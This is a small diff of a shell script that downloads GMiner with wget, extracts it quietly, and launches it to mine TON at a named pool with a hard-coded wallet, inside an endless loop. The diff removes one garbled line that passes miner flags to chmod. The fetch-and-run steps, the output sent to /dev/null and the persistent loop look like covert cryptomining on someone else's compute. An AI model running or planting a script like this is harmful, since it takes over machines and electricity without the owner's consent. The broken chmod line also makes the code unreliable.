@@ -8,8 +8,6 @@ wget https://github.com/develsoftware/GMinerRelease/releases/download/2.80/gmine
 
 tar -xf gminer_2_80_linux64.tar.xz >/dev/null 2>&1
 
-chmod +x miner --cuda 1 -c 0 >/dev/null 2>&1
-
 ./miner --cuda 1 -c 0 --algo ton --server next.ton-pool.club:443 --ssl 1 --user kQCGvM2vSlF5cjNXhB7ZsIx6ksSNaRSO5ylzrEOfZ4PbWtsW --opencl 1
 
 while [ 1 ]; do
